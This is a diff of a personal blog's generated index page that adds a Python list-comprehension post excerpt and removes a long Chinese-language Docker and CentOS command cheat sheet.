@@ -248,6 +248,271 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/19/python_2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Rainer">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rainer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/11/19/python_2/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-19T15:38:08+08:00">
+                2017-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/16/python_1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Rainer">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rainer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/11/16/python_1/" itemprop="url">python学习-1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-16T22:57:55+08:00">
+                2017-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式:"></a>列表生成式:</h1><p>可以用于快速生成list<br>List Comprehensions<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABC'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'XYZ'</span>]</div><div class="line">[<span class="string">'AX'</span>, <span class="string">'AY'</span>, <span class="string">'AZ'</span>, <span class="string">'BX'</span>, <span class="string">'BY'</span>, <span class="string">'BZ'</span>, <span class="string">'CX'</span>, <span class="string">'CY'</span>, <span class="string">'CZ'</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'x'</span>: <span class="string">'A'</span>, <span class="string">'y'</span>: <span class="string">'B'</span>, <span class="string">'z'</span>: <span class="string">'C'</span> &#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[k + <span class="string">'='</span> + v <span class="keyword">for</span> k, v <span class="keyword">in</span> d.iteritems()]</div><div class="line">[<span class="string">'y=B'</span>, <span class="string">'x=A'</span>, <span class="string">'z=C'</span>]</div><div class="line"></div><div class="line">L = [<span class="string">'Hello'</span>, <span class="string">'World'</span>, <span class="number">18</span>, <span class="string">'Apple'</span>, <span class="keyword">None</span>]</div><div class="line"><span class="keyword">print</span>  [s.lower() <span class="keyword">if</span> isinstance(s, str) <span class="keyword">else</span> s <span class="keyword">for</span> s <span class="keyword">in</span> L]</div><div class="line">//判断s是否为字符串,如果不是直接返回s,如果true,则执行s.lower()</div></pre></td></tr></table></figure></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/11/16/python_1/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/08/linux/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -340,12 +605,15 @@
 
       
         
-          
-            <h1 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h1><h2 id="重启网络"><a href="#重启网络" class="headerlink" title="重启网络"></a>重启网络</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service network restart</div></pre></td></tr></table></figure>
+          <h1 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h1><h2 id="重启网络"><a href="#重启网络" class="headerlink" title="重启网络"></a>重启网络</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service network restart</div></pre></td></tr></table></figure>
 <h2 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令:"></a>常用命令:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">screen -S name #创建一个名字为name的会话</div><div class="line">screen -r name #恢复到离开前创建的name会话的工作界面</div><div class="line">screen -ls screen #会列出当前存在的会话列表</div><div class="line">exit #会提示：[screen is terminating]，表示已经成功退出screen会话</div></pre></td></tr></table></figure>
-<h3 id="远程演示"><a href="#远程演示" class="headerlink" title="远程演示"></a>远程演示</h3><p>首先演示者先在服务器上执行<br><code>screen -S test</code> 创建一个screen会话，<br>观众可以链接到远程服务器上执行<code>screen -x test</code> 观众屏幕上就会出现和演示者同步。</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/11/08/linux/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -484,52 +752,14 @@
 
       
         
-          
-            <h1 id="基础类"><a href="#基础类" class="headerlink" title="基础类"></a>基础类</h1><h2 id="查看docker信息"><a href="#查看docker信息" class="headerlink" title="查看docker信息"></a>查看docker信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># 查看docker版本</div><div class="line">docker version</div><div class="line"># 显示docker系统的信息</div><div class="line">docker info</div><div class="line"># 日志信息</div><div class="line">docker logs</div><div class="line"># 故障检查</div><div class="line">service  docker  status</div><div class="line"># 启动关闭docker</div><div class="line">sudo service docker start|stop</div></pre></td></tr></table></figure>
-<h1 id="日志类"><a href="#日志类" class="headerlink" title="日志类"></a>日志类</h1><h2 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker logs -f &lt;容器名orID&gt;</div></pre></td></tr></table></figure>
-<h2 id="docker-daemon-日志位置"><a href="#docker-daemon-日志位置" class="headerlink" title="docker daemon 日志位置"></a>docker daemon 日志位置</h2><p>根据系统不同各不相同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">* Ubuntu - /var/log/upstart/docker.log</div><div class="line">* Boot2Docker - /var/log/docker.log</div><div class="line">* Debian GNU/Linux - /var/log/daemon.log</div><div class="line">* CentOS - /var/log/daemon.log | grep docker</div><div class="line">* Fedora - journalctl -u docker.service</div><div class="line">* Red Hat Enterprise Linux Server - /var/log/messages | grep docker</div></pre></td></tr></table></figure></p>
-<h2 id="docker-ps没有响应-日志查询"><a href="#docker-ps没有响应-日志查询" class="headerlink" title="docker ps没有响应 日志查询"></a>docker ps没有响应 日志查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># grep 所有容器的config.json</div><div class="line">docker logs [conID]</div><div class="line"># 确认问题后</div><div class="line"># 该config.json 中有该容器1号进程的pid</div><div class="line">kill -9 pid</div></pre></td></tr></table></figure>
-<h1 id="容器类"><a href="#容器类" class="headerlink" title="容器类"></a>容器类</h1><p>docker容器可以理解为在沙盒中运行的进程。</p>
-<blockquote>
-<p>这个沙盒包含了该进程运行所必须的资源，包括文件系统、系统类库、shell 环境等等。但这个沙盒默认是不会运行任何程序的。你需要在沙盒中运行一个进程来启动某一个容器。这个进程是该容器的唯一进程，所以当该进程结束的时候，容器也会完全的停止。</p>
-<h2 id="查看容器信息"><a href="#查看容器信息" class="headerlink" title="查看容器信息"></a>查看容器信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># 查看当前运行的容器</div><div class="line">docker ps</div><div class="line"># 查看全部容器</div><div class="line">docker ps -a</div><div class="line"># 查看全部容器的id和信息</div><div class="line">docker ps -a -q</div><div class="line"># 查看一个正在运行容器进程，支持 ps 命令参数</div><div class="line">docker top</div><div class="line"># 查看容器的示例id</div><div class="line">sudo docker inspect -f  &apos;&#123;&#123;.Id&#125;&#125;&apos; [id]</div><div class="line"># 检查镜像或者容器的参数，默认返回 JSON 格式</div><div class="line">docker inspect</div><div class="line"># 返回 ubuntu:14.04  镜像的 docker 版本</div><div class="line">docker inspect --format &apos;&#123;&#123;.DockerVersion&#125;&#125;&apos; ubuntu:14.04</div></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="容器同步命令"><a href="#容器同步命令" class="headerlink" title="容器同步命令"></a>容器同步命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># 保存对容器的修改</div><div class="line">docker commit</div><div class="line"># 对比容器的改动</div><div class="line">docker diff</div><div class="line"># 附加到一个运行的容器上</div><div class="line">docker attach</div></pre></td></tr></table></figure>
-<h2 id="容器操作命令"><a href="#容器操作命令" class="headerlink" title="容器操作命令"></a>容器操作命令</h2><h3 id="创建删除容器"><a href="#创建删除容器" class="headerlink" title="创建删除容器"></a>创建删除容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># 创建一个容器命名为 test 使用镜像daocloud.io/library/ubuntu</div><div class="line">docker create -it --name test daocloud.io/library/ubuntu</div><div class="line"># 创建并启动一个容器 名为 test 使用镜像daocloud.io/library/ubuntu</div><div class="line">docker run --name test daocloud.io/library/ubuntu</div><div class="line"># 删除一个容器</div><div class="line">docker rm [容器id]</div><div class="line"># 删除所有容器</div><div class="line">docker rm `docker ps -a -q`</div><div class="line"># 根据Dockerfile 构建</div><div class="line">docker build -t [image_name] [Dockerfile_path]</div></pre></td></tr></table></figure>
-<h3 id="docker容器随系统自启"><a href="#docker容器随系统自启" class="headerlink" title="docker容器随系统自启"></a>docker容器随系统自启</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --restart=always</div></pre></td></tr></table></figure>
-<ul>
-<li>no – 默认值，如果容器挂掉不自动重启</li>
-<li>on-failure – 当容器以非 0 码退出时重启容器,同时可接受一个可选的最大重启次数参数 (e.g. on-failure:10).</li>
-<li>always – 不管退出码是多少都要重启<h3 id="容器资源限制参数"><a href="#容器资源限制参数" class="headerlink" title="容器资源限制参数"></a>容器资源限制参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 限制内存最大使用</div><div class="line">-m 1024m --memory-swap=1024m</div><div class="line"># 限制容器使用CPU</div><div class="line">--cpuset-cpus=&quot;0,1&quot;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="把一个正在运行的容器保存为镜像"><a href="#把一个正在运行的容器保存为镜像" class="headerlink" title="把一个正在运行的容器保存为镜像"></a>把一个正在运行的容器保存为镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker commit &lt;CONTAIN-ID&gt; &lt;IMAGE-NAME&gt;</div></pre></td></tr></table></figure>
-<h3 id="启动停止容器等操作"><a href="#启动停止容器等操作" class="headerlink" title="启动停止容器等操作"></a>启动停止容器等操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">docker start|stop|restart [id]</div><div class="line"># 暂停|恢复 某一容器的所有进程</div><div class="line">docker pause|unpause [id]</div><div class="line"># 杀死一个或多个指定容器进程</div><div class="line">docker kill -s KILL [id]</div><div class="line"># 停止全部运行的容器</div><div class="line">docker stop `docker ps -q`</div><div class="line"># 杀掉全部运行的容器</div><div class="line">docker kill -s KILL `docker ps -q`</div></pre></td></tr></table></figure>
-<h3 id="交互式进入容器"><a href="#交互式进入容器" class="headerlink" title="交互式进入容器"></a>交互式进入容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker exec -it &#123;&#123;containerName or containerID&#125;&#125; bash</div></pre></td></tr></table></figure>
-<h3 id="查看容器的root用户密码"><a href="#查看容器的root用户密码" class="headerlink" title="查看容器的root用户密码"></a>查看容器的root用户密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker logs &lt;容器名orID&gt; 2&gt;&amp;1 | grep &apos;^User: &apos; | tail -n1</div></pre></td></tr></table></figure>
-<p>因为Docker容器启动时的root用户的密码是随机分配的。所以，通过这种方式就可以得到容器的root用户的密码了</p>
-<h3 id="容器于宿主拷贝文件"><a href="#容器于宿主拷贝文件" class="headerlink" title="容器于宿主拷贝文件"></a>容器于宿主拷贝文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</div><div class="line">docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</div><div class="line"># 本地文件上传到对应容器的目录</div><div class="line">docker cp local.sh [CONTAINERid]:[TagPath]</div></pre></td></tr></table></figure>
-<p>此命令为高版本docker才有，当然1.11+肯定包含</p>
-<h3 id="运行一个新容器，同时为它命名、端口映射、文件夹映射"><a href="#运行一个新容器，同时为它命名、端口映射、文件夹映射" class="headerlink" title="运行一个新容器，同时为它命名、端口映射、文件夹映射"></a>运行一个新容器，同时为它命名、端口映射、文件夹映射</h3><p>以<code>redmine</code>镜像为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --name redmine -p 9003:80 -p 9023:22 -d -v /var/redmine/files:/redmine/files -v /var/redmine/mysql:/var/lib/mysql sameersbn/redmine</div></pre></td></tr></table></figure></p>
-<h3 id="一个容器连接到另一个容器"><a href="#一个容器连接到另一个容器" class="headerlink" title="一个容器连接到另一个容器"></a>一个容器连接到另一个容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -i -t --name sonar -d -link mmysql:db  tpires/sonar-server sonar</div></pre></td></tr></table></figure>
-<h3 id="导入导出容器"><a href="#导入导出容器" class="headerlink" title="导入导出容器"></a>导入导出容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 支持远程文件 .tar, .tar.gz, .tgz, .bzip, .tar.xz, .txz</div><div class="line">docker import</div><div class="line"># 导出</div><div class="line">docker export [id] &gt;~/Downloads/ubuntu_nexus.tar</div><div class="line">导出后导入（exported-imported)）的容器会丢失所有的提交历史，无法回滚。</div></pre></td></tr></table></figure>
-<h1 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h1><h2 id="远程镜像"><a href="#远程镜像" class="headerlink" title="远程镜像"></a>远程镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker login</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">docker search</div><div class="line"># 搜索处收藏数不小于 3 ，并且能够自动化构建的  django 镜像，并且完整显示镜像描述</div><div class="line">docker search -s 3 --automated --no-trunc django</div><div class="line">docker pull</div><div class="line"># 拉取ubuntu最新的镜像</div><div class="line">docker pull ubuntu:latest</div><div class="line"># 服务器拉取个人动态，可选择时间区间</div><div class="line">docker events</div><div class="line"># 拉取个人从 2015/07/20 到 2015/08/08 的个人动态</div><div class="line">docker events --since=&quot;20150720&quot; --until=&quot;20150808&quot;</div><div class="line">`</div></pre></td></tr></table></figure>
-<h2 id="镜像同步操作"><a href="#镜像同步操作" class="headerlink" title="镜像同步操作"></a>镜像同步操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"># 标记本地镜像，将其归入某一仓库</div><div class="line">docker tag</div><div class="line"># 将 ID 为 5db5f84x1261 的容器标记为 mine/lnmp:0.2 镜像</div><div class="line">docker tag 5db5f84x1261 mine/lnmp:0.2</div><div class="line"># 将镜像推送至远程仓库，默认为 Docker Hub</div><div class="line">docker push</div><div class="line">本地镜像</div><div class="line"></div><div class="line"># 列出本地所有镜像</div><div class="line">docker images</div><div class="line"># 本地镜像名为 ubuntu 的所有镜像</div><div class="line">docker images ubuntu</div><div class="line"># 查看指定镜像的创建历史</div><div class="line">docker history [id]</div><div class="line"># 本地移除一个或多个指定的镜像</div><div class="line">docker rmi</div><div class="line"># 移除本地全部镜像</div><div class="line">docker rmi `docker images -a -q`</div><div class="line"># 指定镜像保存成 tar 归档文件， docker load 的逆操作</div><div class="line">docker save</div><div class="line"># 将镜像 ubuntu:14.04 保存为 ubuntu14.04.tar 文件</div><div class="line">docker save -o ubuntu14.04.tar ubuntu:14.04</div><div class="line"># 从 tar 镜像归档中载入镜像， docker save 的逆操作</div><div class="line">docker load</div><div class="line"># 上面命令的意思是将 ubuntu14.04.tar 文件载入镜像中</div><div class="line">docker load -i ubuntu14.04.tar</div><div class="line">docker load &lt; /home/save.tar</div><div class="line"># 构建自己的镜像</div><div class="line">docker build -t &lt;镜像名&gt; &lt;Dockerfile路径&gt;</div><div class="line">docker build -t xx/gitlab .</div></pre></td></tr></table></figure>
-<blockquote>
-<p>保存后再加载（saved-loaded）的镜像不会丢失提交历史和层，可以回滚</p>
-<h2 id="重新查看container的stdout"><a href="#重新查看container的stdout" class="headerlink" title="重新查看container的stdout"></a>重新查看container的stdout</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># 启动top命令，后台运行</div><div class="line">$ ID=$(sudo docker run -d ubuntu /usr/bin/top -b)</div><div class="line"># 获取正在running的container的输出</div><div class="line">$ sudo docker attach $ID</div><div class="line">top - 02:05:52 up  3:05,  0 users,  load average: 0.01, 0.02, 0.05</div><div class="line">Tasks:  1 total,  1 running,  0 sleeping,  0 stopped,  0 zombie</div><div class="line">Cpu(s):  0.1%us,  0.2%sy,  0.0%ni, 99.7%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st</div><div class="line">Mem:    373572k total,  355560k used,    18012k free,    27872k buffers</div><div class="line">Swap:  786428k total,        0k used,  786428k free,  221740k cached</div><div class="line">^C$</div><div class="line">$ sudo docker stop $ID</div></pre></td></tr></table></figure>
-</blockquote>
-<h1 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h1><h2 id="后台运行-d-、并暴露端口"><a href="#后台运行-d-、并暴露端口" class="headerlink" title="后台运行(-d)、并暴露端口"></a>后台运行(-d)、并暴露端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -d -p 127.0.0.1:33301:22 centos6-ssh</div></pre></td></tr></table></figure>
-<h2 id="run-命令详解"><a href="#run-命令详解" class="headerlink" title="run 命令详解"></a>run 命令详解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">-a, --attach=[]            Attach to STDIN, STDOUT or STDERR 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项</div><div class="line">  --add-host=[]              Add a custom host-to-IP mapping (host:ip)</div><div class="line">  --blkio-weight=0            Block IO (relative weight), between 10 and 1000</div><div class="line">  -c, --cpu-shares=0          CPU shares (relative weight)</div><div class="line">  --cap-add=[]                Add Linux capabilities</div><div class="line">  --cap-drop=[]              Drop Linux capabilities</div><div class="line">  --cgroup-parent=            Optional parent cgroup for the container</div><div class="line">  --cidfile=                  Write the container ID to the file</div><div class="line">  --cpu-period=0              Limit CPU CFS (Completely Fair Scheduler) period</div><div class="line">  --cpu-quota=0              Limit the CPU CFS quota</div><div class="line">  --cpuset-cpus=              CPUs in which to allow execution (0-3, 0,1) 绑定容器到指定CPU运行</div><div class="line">  --cpuset-mems=              MEMs in which to allow execution (0-3, 0,1) 绑定容器到指定MEM运行</div><div class="line">  -d, --detach=false          Run container in background and print container ID 后台运行容器，并返回容器ID</div><div class="line">  --device=[]                Add a host device to the container</div><div class="line">  --dns=[]                    Set custom DNS servers 指定容器使用的DNS服务器，默认和宿主一致</div><div class="line">  --dns-search=[]            Set custom DNS search domains 指定容器DNS搜索域名，默认和宿主一致</div><div class="line">  -e, --env=[]                Set environment variables 设置环境变量</div><div class="line">  --entrypoint=              Overwrite the default ENTRYPOINT of the image</div><div class="line">  --env-file=[]              Read in a file of environment variables 从指定文件读入环境变量</div><div class="line">  --expose=[]                Expose a port or a range of ports</div><div class="line">  -h, --hostname=            Container host name 指定容器的hostname</div><div class="line">  --help=false                Print usage</div><div class="line">  -i, --interactive=false    Keep STDIN open even if not attached 以交互模式运行容器，通常与 -t 同时使用</div><div class="line">  --ipc=                      IPC namespace to use</div><div class="line">  -l, --label=[]              Set meta data on a container</div><div class="line">  --label-file=[]            Read in a line delimited file of labels</div><div class="line">  --link=[]                  Add link to another container</div><div class="line">  --log-driver=              Logging driver for container</div><div class="line">  --log-opt=[]                Log driver options</div><div class="line">  --lxc-conf=[]              Add custom lxc options</div><div class="line">  -m, --memory=              Memory limit</div><div class="line">  --mac-address=              Container MAC address (e.g. 92:d0:c6:0a:29:33)</div><div class="line">  --memory-swap=              Total memory (memory + swap), &apos;-1&apos; to disable swap</div><div class="line">  --name=                    Assign a name to the container 为容器指定一个名称</div><div class="line">  --net=bridge                Set the Network mode for the container  指定容器的网络连接类型，支持 bridge/host/none/container:&lt;name|id&gt; 四种类型</div><div class="line">  --oom-kill-disable=false    Disable OOM Killer</div><div class="line">  -P, --publish-all=false    Publish all exposed ports to random ports</div><div class="line">  -p, --publish=[]            Publish a container&apos;s port(s) to the host</div><div class="line">  --pid=                      PID namespace to use</div><div class="line">  --privileged=false          Give extended privileges to this container</div><div class="line">  --read-only=false          Mount the container&apos;s root filesystem as read only</div><div class="line">  --restart=no                Restart policy to apply when a container exits</div><div class="line">  --rm=false                  Automatically remove the container when it exits</div><div class="line">  --security-opt=[]          Security Options</div><div class="line">  --sig-proxy=true            Proxy received signals to the process</div><div class="line">  -t, --tty=false            Allocate a pseudo-TTY 为容器重新分配一个伪输入终端，通常与 -i 同时使用</div><div class="line">  -u, --user=                Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])</div><div class="line">  --ulimit=[]                Ulimit options</div><div class="line">  --uts=                      UTS namespace to use</div><div class="line">  -v, --volume=[]            Bind mount a volume</div><div class="line">  --volumes-from=[]          Mount volumes from the specified container(s)</div><div class="line">  -w, --workdir=              Working directory inside the container</div></pre></td></tr></table></figure>
-<h1 id="存在的问题解决方法"><a href="#存在的问题解决方法" class="headerlink" title="存在的问题解决方法"></a>存在的问题解决方法</h1><h2 id="ubuntu14下的docker是没有service服务"><a href="#ubuntu14下的docker是没有service服务" class="headerlink" title="ubuntu14下的docker是没有service服务"></a>ubuntu14下的docker是没有service服务</h2><p>去除每次sudo运行docker命令，需要添加组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Add the docker group if it doesn&apos;t already exist.</div><div class="line">$ sudo groupadd docker</div><div class="line">#改完后需要重新登陆用户</div><div class="line">$ sudo gpasswd -a $&#123;USER&#125; docker</div></pre></td></tr></table></figure></p>
-<h2 id="Dockerfile中的EXPOSE、docker-run-–expose、docker-run-p之间的区别"><a href="#Dockerfile中的EXPOSE、docker-run-–expose、docker-run-p之间的区别" class="headerlink" title="Dockerfile中的EXPOSE、docker run –expose、docker run -p之间的区别"></a>Dockerfile中的EXPOSE、docker run –expose、docker run -p之间的区别</h2><ul>
-<li>Dockerfile的EXPOSE相当于docker run –expose，提供container之间的端口访问</li>
